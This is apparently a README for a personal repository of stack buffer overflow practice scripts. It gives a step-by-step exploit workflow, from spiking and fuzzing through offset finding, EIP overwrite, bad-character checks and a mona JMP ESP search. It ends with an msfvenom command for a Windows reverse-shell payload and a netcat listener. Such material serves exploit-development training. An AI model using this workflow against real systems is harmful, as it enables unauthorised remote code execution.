# BOF
Buffer Overflow scripts to help with future Buffer Overflow adventures.

* Make sure to make these script executable for them to run.

## 1 - Spiking
* Use the trun.spk
	* trun can be replaced by other variables inside the program you're debugging.

## 2 - Fuzzing
* Use fuzz.py
	* Command variable is what you found from spiking
* Set IP/Port variable

## 3 - Find the Offset
* Create and offset from the value you got from fuzzing then change the valule after ```-l ``` in ```/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000```
* Use the offset.py
	* Paste metasploit output in the offset variable
* To find the offset use the EIP value found in the python script and run ```/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337```
	* Change the value of -q to the EIP value
	* Make sure the ```-l``` is the same length as the original metasplot command.

## 4 - Overwrite the EIP
* Use eip.py
	* Change the 2003 in the shellcode to the offset value.
* EIP should read all 42. If there is a 41 in there your offset is wrong.

## 5 - Finding Bad Characters
* Use badchar.py
* In hex dump you should notice any characters that are out of sequencial order. Take not of them you need them when generating your shell code.

## 6 - Module Enumeration
* Download and install [mona modules](https://github.com/corelan/mona)
* Find the FFEF JSP ESP pointer using mona ```!mona find -s "\xff\xe4" -m essfunc.dll```
	* Replace essfunc.dll with mona results that doesnt have security.
* Use modules.py
	* replace the ```"\xaf\x11\x50\x62"``` in the codewith the return address you get from mona.
		* Remember little indian format and it might be backwards in hex when you input it.
* Set your breakpoint in your debugger

## 7 - Generating Shellcode
* Create payload with ```msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= EXITFUNC=thread -f c -a x86 -b "\x00"```
	* __Input LHOST and LPORT__
	* Add all your badcharacters after ```-b``` flag
* Setup netcat listener
* Use shellcode.py
	* Input you msfvenom payload in the overflow variable in between the quotes. When copying the output of msfvenom dont include the last semicolon.
	* Change the ```2003``` to your offset at the EIP.
	* Change ```"\xaf\x11\x50\x62"``` to the return address you found in mona when enumerating the modules.